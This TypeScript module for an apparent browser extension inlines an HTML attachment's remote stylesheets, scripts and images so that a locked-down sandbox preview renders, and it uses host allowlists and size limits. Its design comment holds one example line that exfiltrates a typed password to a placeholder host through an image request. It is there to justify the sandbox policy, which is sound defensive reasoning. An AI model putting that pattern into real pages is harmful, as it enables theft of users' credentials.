import { isAssetUrlAllowed } from '../shared/settings.ts'

/**
 * Builds an HTML attachment's linked resources into the document before it is
 * rendered, so a file that gets its styling from a CDN is readable.
 *
 * ## Why inline rather than allow the host
 *
 * The obvious fix is to add the CDN to the sandbox CSP. It is the wrong one, and
 * not only because that CSP is static and a user-configured host could never
 * appear in it. `default-src 'none'` is what makes previewed content unable to
 * *send*: with any host reachable, a file that draws a fake login form can ship
 * what you type to it via `new Image().src = 'https://host/?' + password`.
 *
 * So the document keeps reaching nothing. Instead the extension fetches each URL
 * — through the service worker, with no cookies — and the bytes are built in as
 * `<style>`, inline script, or a `data:` URI. What leaks is bounded and static:
 * hosts named in the file, fetched once, before a single line of the page runs.
 * Nothing the page computes at runtime can reach the network, which is the
 * property that actually matters.
 *
 * ## Why this is string surgery and not a DOM round-trip
 *
 * `DOMParser` would be tidier. But `html` is the one kind whose file *is* the
 * document, and re-serialising a stranger's markup through a parser rewrites
 * bytes nobody asked to have rewritten — quoting, void tags, whitespace, anything
 * malformed. Here every byte outside a replaced span survives untouched, and a
 * tag this scanner fails to understand is simply left alone: the failure mode is
 * "not inlined", never "corrupted". It also keeps the whole thing testable under
 * `node --test`, which has no DOM.
 *
 * The single scanning regex matches whole elements in document order, so a
 * `<link>` inside a comment or inside a script's body is consumed along with its
 * container and never rewritten.
 *
 * ## What is deliberately not handled
 *
 * - Relative URLs. A `srcdoc` document has no base URL to resolve them against.
 * - `url()` inside a `style="…"` attribute.
 * - `<source>` in `<picture>`/`<video>`, and `<img srcset>` candidates — a
 *   `srcset` is emptied rather than rewritten so the browser falls back to the
 *   `src` that did get inlined.
 * - `async`/`defer` ordering. An inlined script runs where it sits, because an
 *   inline script cannot be deferred. Wrapping the body in a DOMContentLoaded
 *   listener would preserve the timing but move every top-level declaration into
 *   a function scope, which breaks far more files than it fixes.
 */

export interface Asset {
  /** Lower-cased, parameters stripped. May be empty if the server sent none. */
  contentType: string
  base64: string
  byteLength: number
}

export type AssetFetcher = (url: string) => Promise<Asset>

export interface InlineOptions {
  hosts: string[]
  fetchAsset: AssetFetcher
}

export interface InlineResult {
  html: string
  /** How many resources were built into the document. */
  inlined: number
  /** Hosts that were referenced but are not on the allowlist, in first-seen order. */
  blockedHosts: string[]
  /** Resources that were allowed but could not be fetched. */
  failed: number
}

/**
 * Document-wide ceilings. The per-asset ceiling lives in the service worker; these
 * bound the total, because a `srcdoc` string is held in memory three times over —
 * built here, posted, then parsed — and a hundred fonts would be felt.
 */
const MAX_ASSETS = 100
const MAX_TOTAL_BYTES = 16 * 1024 * 1024

/** `@import` chains are legitimate but shallow in practice; this stops a cycle. */
const MAX_IMPORT_DEPTH = 3

/**
 * An attribute region, up to the `>` that ends the tag.
 *
 * Quoted runs are consumed whole rather than character by character, because a
 * `>` inside a quoted value is perfectly legal — `<img alt="a>b" src="…">` — and a
 * plain `[^>]*` stops at it, finds no `src`, and silently leaves the tag alone.
 *
 * The three branches cannot match the same first character, so there is no
 * ambiguity to backtrack through.
 */
const TAG_ATTRS = `(?:"[^"]*"|'[^']*'|[^>"'])*`

/**
 * Elements, matched whole and in document order.
 *
 * Comments come first so anything inside one is consumed rather than rewritten,
 * and `<script>`/`<style>` capture their bodies for the same reason — text that
 * merely looks like a tag must not be treated as one.
 */
const ELEMENT = new RegExp(
  [
    '<!--[\\s\\S]*?-->',
    `<script\\b(${TAG_ATTRS})>([\\s\\S]*?)</script\\s*>`,
    `<style\\b(${TAG_ATTRS})>([\\s\\S]*?)</style\\s*>`,
    `<link\\b(${TAG_ATTRS})>`,
    `<img\\b(${TAG_ATTRS})>`,
  ].join('|'),
  'gi',
)

/** A replacement for one span of the source. `null` leaves the span as it was. */
interface Edit {
  start: number
  end: number
  build: () => Promise<string | null>
}

export async function inlineRemoteAssets(
  html: string,
  options: InlineOptions,
): Promise<InlineResult> {
  const loader = createLoader(options)

  // Cheap bail-out: nothing to resolve without an absolute https reference, and
  // the common case is a self-contained file.
  if (!/https:\/\//i.test(html)) {
    return { html, inlined: 0, blockedHosts: [], failed: 0 }
  }

  const edits: Edit[] = []
  ELEMENT.lastIndex = 0

  for (let match = ELEMENT.exec(html); match; match = ELEMENT.exec(html)) {
    const text = match[0]
    const at = match.index

    if (match[1] !== undefined) {
      collectScript(edits, loader, at, text, match[1], match[2] ?? '')
    } else if (match[3] !== undefined) {
      collectStyle(edits, loader, at, match[3], match[4] ?? '')
    } else if (match[5] !== undefined) {
      collectLink(edits, loader, at, text, match[5])
    } else if (match[6] !== undefined) {
      collectImage(edits, loader, at, match[6], '<img'.length)
    }
    // A comment matched: consumed, nothing to do.
  }

  if (edits.length === 0) {
    return { html, inlined: 0, blockedHosts: loader.blockedHosts(), failed: loader.failed() }
  }

  const built = await Promise.all(
    edits.map((edit) => edit.build().catch((): string | null => null)),
  )

  return {
    html: splice(html, edits, built),
    inlined: loader.inlined(),
    blockedHosts: loader.blockedHosts(),
    failed: loader.failed(),
  }
}

/* ------------------------------------------------------------------ elements */

/** `<script src="https://…"></script>` becomes the same tag with the code in it. */
function collectScript(
  edits: Edit[],
  loader: Loader,
  at: number,
  text: string,
  attrText: string,
  body: string,
): void {
  const attrs = parseAttributes(attrText)
  const src = attrs.get('src')
  const url = src && absoluteUrl(src.value)
  if (!src || !url || body.trim()) return

  // The src attribute is cut out of the tag rather than the tag rebuilt, so
  // `type="module"`, `nonce`, `data-*` and anything else survive verbatim.
  const head = `<script${attrText.slice(0, src.start)}${attrText.slice(src.end)}>`

  edits.push({
    start: at,
    end: at + text.length,
    build: async () => {
      const asset = await loader.load(url)
      if (!asset) return null
      return `${head}${maskClosingTag(decodeText(asset), 'script')}</script>`
    },
  })
}

/** An inline `<style>` block: its own `url()` and `@import` still point outward. */
function collectStyle(
  edits: Edit[],
  loader: Loader,
  at: number,
  attrText: string,
  body: string,
): void {
  if (!body.includes('https://')) return

  // Measured from the front: the closing tag may carry whitespace, so counting
  // back from the end of the match would be off by however much.
  const bodyStart = at + '<style'.length + attrText.length + 1

  edits.push({
    start: bodyStart,
    end: bodyStart + body.length,
    // No base URL: an inline block has nothing to resolve relative paths against,
    // so only the absolute references in it are reachable anyway.
    build: async () => maskClosingTag(await inlineCss(body, null, loader, 0), 'style'),
  })
}

/** `<link rel="stylesheet" href="https://…">` becomes a `<style>` with the sheet. */
function collectLink(
  edits: Edit[],
  loader: Loader,
  at: number,
  text: string,
  attrText: string,
): void {
  const attrs = parseAttributes(attrText)

  const rel = attrs.get('rel')?.value ?? ''
  if (!/(^|\s)stylesheet(\s|$)/i.test(rel)) return

  const href = attrs.get('href')
  const url = href && absoluteUrl(href.value)
  if (!url) return

  // `media` is the one attribute that changes what the sheet means, so it is
  // carried across; the raw source text is reused rather than re-escaped, which
  // would double-encode any entity in it.
  const media = attrs.get('media')
  const open = media?.quoted ? `<style media=${media.quoted}>` : '<style>'

  edits.push({
    start: at,
    end: at + text.length,
    build: async () => {
      const asset = await loader.load(url)
      if (!asset) return null
      const css = await inlineCss(decodeText(asset), url, loader, 0)
      return `${open}${maskClosingTag(css, 'style')}</style>`
    },
  })
}

/** `<img src="https://…">` becomes the same tag holding a `data:` URI. */
function collectImage(
  edits: Edit[],
  loader: Loader,
  at: number,
  attrText: string,
  offset: number,
): void {
  const attrs = parseAttributes(attrText)

  const src = attrs.get('src')
  const url = src && absoluteUrl(src.value)
  if (!src || !url || src.valueStart === null || src.valueEnd === null) return

  edits.push({
    start: at + offset + src.valueStart,
    end: at + offset + src.valueEnd,
    build: async () => {
      const asset = await loader.load(url)
      return asset ? `"${escapeAttribute(dataUri(asset))}"` : null
    },
  })

  // A surviving srcset wins over src, so the inlined image would never be shown.
  // Emptying it is enough — no candidates means the browser falls back to src.
  const srcset = attrs.get('srcset')
  if (srcset && srcset.valueStart !== null && srcset.valueEnd !== null) {
    edits.push({
      start: at + offset + srcset.valueStart,
      end: at + offset + srcset.valueEnd,
      build: async () => (await loader.load(url)) && '""',
    })
  }
}

/* ----------------------------------------------------------------------- css */

/**
 * Resolves what a stylesheet reaches for: `@import`ed sheets, and the fonts and
 * images behind `url()`.
 *
 * Imports are handled first and separately, because each imported sheet resolves
 * its own `url()`s against its own address — running one `url()` pass over the
 * assembled text would resolve them against the wrong base.
 */
async function inlineCss(
  css: string,
  baseUrl: string | null,
  loader: Loader,
  depth: number,
): Promise<string> {
  const withImports =
    depth >= MAX_IMPORT_DEPTH
      ? css
      : await replaceAsync(css, IMPORT, async (match) => {
          const reference = match[1] ?? match[2] ?? match[3] ?? match[4] ?? match[5] ?? ''
          const condition = (match[6] ?? '').trim()
          const url = absoluteUrl(reference, baseUrl)
          if (!url) return null

          const asset = await loader.load(url)
          if (!asset) return null

          const imported = await inlineCss(decodeText(asset), url, loader, depth + 1)
          // A conditional import has to keep its condition, or a print-only sheet
          // would suddenly apply on screen.
          return condition ? `@media ${condition}{${imported}}` : imported
        })

  return replaceAsync(withImports, CSS_URL, async (match) => {
    const reference = match[1] ?? match[2] ?? match[3] ?? ''
    // Already inlined by a nested pass, or an in-document reference like a
    // clip-path or SVG filter id.
    if (!reference || /^(data:|blob:|#)/i.test(reference)) return null

    const url = absoluteUrl(reference, baseUrl)
    if (!url) return null

    const asset = await loader.load(url)
    return asset ? `url("${dataUri(asset)}")` : null
  })
}

/** `@import url("x.css") screen;` and `@import "x.css";`, with the trailing conditions. */
const IMPORT =
  /@import\s+(?:url\(\s*(?:"([^"]*)"|'([^']*)'|([^)"'\s]*))\s*\)|"([^"]*)"|'([^']*)')([^;]*);?/gi

const CSS_URL = /url\(\s*(?:"([^"]*)"|'([^']*)'|([^)"'\s]+))\s*\)/gi

/* -------------------------------------------------------------------- loader */

interface Loader {
  load(url: string): Promise<Asset | null>
  inlined(): number
  failed(): number
  blockedHosts(): string[]
}

/**
 * Fetches each URL at most once, and enforces the two limits that are not the
 * service worker's to enforce: the allowlist, and the document-wide budget.
 *
 * A refusal here is never an exception. One unreachable font must cost the reader
 * that font, not the document.
 */
function createLoader(options: InlineOptions): Loader {
  const cache = new Map<string, Promise<Asset | null>>()
  const blocked: string[] = []
  let requested = 0
  let spent = 0
  let ok = 0
  let bad = 0

  const fetchOnce = async (url: string): Promise<Asset | null> => {
    if (!isAssetUrlAllowed(url, options.hosts)) {
      const host = hostOf(url)
      if (host && !blocked.includes(host)) blocked.push(host)
      return null
    }

    if (requested >= MAX_ASSETS || spent >= MAX_TOTAL_BYTES) {
      bad += 1
      return null
    }
    requested += 1

    try {
      const asset = await options.fetchAsset(url)
      spent += asset.byteLength
      ok += 1
      return asset
    } catch {
      bad += 1
      return null
    }
  }

  return {
    load(url) {
      const cached = cache.get(url)
      if (cached) return cached

      const task = fetchOnce(url)
      cache.set(url, task)
      return task
    },
    inlined: () => ok,
    failed: () => bad,
    blockedHosts: () => [...blocked],
  }
}

/* ------------------------------------------------------------------- helpers */

/**
 * Absolute https URLs only.
 *
 * http is excluded rather than upgraded: it would be a downgrade for the fetch and
 * the extension holds no permission for it. A relative reference resolves only
 * when the caller has a base — a stylesheet's own address — because the document
 * itself, being `srcdoc`, has none.
 */
function absoluteUrl(reference: string, baseUrl: string | null = null): string | null {
  const raw = decodeEntities(reference).trim()
  if (!raw) return null

  try {
    const url = baseUrl ? new URL(raw, baseUrl) : new URL(raw)
    return url.protocol === 'https:' ? url.toString() : null
  } catch {
    return null
  }
}

function hostOf(url: string): string | null {
  try {
    return new URL(url).hostname.toLowerCase()
  } catch {
    return null
  }
}

function dataUri(asset: Asset): string {
  const type = /^[a-z0-9!#$&^_.+-]+\/[a-z0-9!#$&^_.+-]+$/.test(asset.contentType)
    ? asset.contentType
    : 'application/octet-stream'

  return `data:${type};base64,${asset.base64}`
}

function decodeText(asset: Asset): string {
  const binary = atob(asset.base64)
  const bytes = new Uint8Array(binary.length)
  for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i)
  return new TextDecoder('utf-8').decode(bytes)
}

/**
 * Stops fetched text from closing the element it is being placed inside.
 *
 * A minified bundle containing the string `"</script>"` would otherwise end the
 * script there and spill the rest of the file into the page as markup. Inside a
 * JS or CSS string `<\/script` means exactly what `</script` did; anywhere else
 * `<` was already a syntax error, so nothing valid is changed.
 */
function maskClosingTag(source: string, tag: 'script' | 'style'): string {
  return source.replace(new RegExp(`</(?=${tag})`, 'gi'), '<\\/')
}

/** For a value this module generates and writes into a double-quoted attribute. */
function escapeAttribute(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;')
}

const ENTITIES: Record<string, string> = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&#39;': "'",
  '&apos;': "'",
}

function decodeEntities(value: string): string {
  return value.replace(/&(amp|lt|gt|quot|apos|#39);/gi, (entity) => ENTITIES[entity.toLowerCase()] ?? entity)
}

interface Attribute {
  /** Source text of the value, entities left encoded. */
  value: string
  /** The value with its quotes, as written, or null when there was none. */
  quoted: string | null
  /** Offsets of the whole `name="value"` span within the attribute region. */
  start: number
  end: number
  /** Offsets of the value including quotes, or null when the attribute had none. */
  valueStart: number | null
  valueEnd: number | null
}

const ATTRIBUTE = /([^\s/>="']+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]*)))?/g

/** Names are lower-cased; everything else is kept exactly as the file wrote it. */
function parseAttributes(attrText: string): Map<string, Attribute> {
  const attrs = new Map<string, Attribute>()
  ATTRIBUTE.lastIndex = 0

  for (let match = ATTRIBUTE.exec(attrText); match; match = ATTRIBUTE.exec(attrText)) {
    const name = match[1]!.toLowerCase()
    if (attrs.has(name)) continue

    const value = match[2] ?? match[3] ?? match[4]
    const end = match.index + match[0].length

    if (value === undefined) {
      attrs.set(name, { value: '', quoted: null, start: match.index, end, valueStart: null, valueEnd: null })
      continue
    }

    // Quoted values occupy two characters more of the source than they contain.
    const wasQuoted = match[2] !== undefined || match[3] !== undefined
    const valueStart = end - value.length - (wasQuoted ? 2 : 0)

    attrs.set(name, {
      value,
      quoted: attrText.slice(valueStart, end),
      start: match.index,
      end,
      valueStart,
      valueEnd: end,
    })
  }

  return attrs
}

/**
 * An async `String.replace`.
 *
 * Every match is started before any is awaited, so a document's assets resolve
 * concurrently rather than one CDN round-trip after another.
 */
async function replaceAsync(
  input: string,
  pattern: RegExp,
  replace: (match: RegExpExecArray) => Promise<string | null>,
): Promise<string> {
  const matches: RegExpExecArray[] = []
  pattern.lastIndex = 0
  for (let match = pattern.exec(input); match; match = pattern.exec(input)) {
    matches.push(match)
    // A zero-length match would spin forever.
    if (match[0].length === 0) pattern.lastIndex += 1
  }

  if (matches.length === 0) return input

  const built = await Promise.all(
    matches.map((match) => replace(match).catch((): string | null => null)),
  )

  return splice(
    input,
    matches.map((match) => ({
      start: match.index,
      end: match.index + match[0].length,
      build: async () => null,
    })),
    built,
  )
}

/** Rebuilds the string with each edit applied. Edits must be sorted and disjoint. */
function splice(input: string, edits: Edit[], values: (string | null)[]): string {
  const out: string[] = []
  let cursor = 0

  for (let i = 0; i < edits.length; i += 1) {
    const edit = edits[i]!
    const value = values[i]
    if (value === null || value === undefined || edit.start < cursor) continue

    out.push(input.slice(cursor, edit.start), value)
    cursor = edit.end
  }

  out.push(input.slice(cursor))
  return out.join('')
}
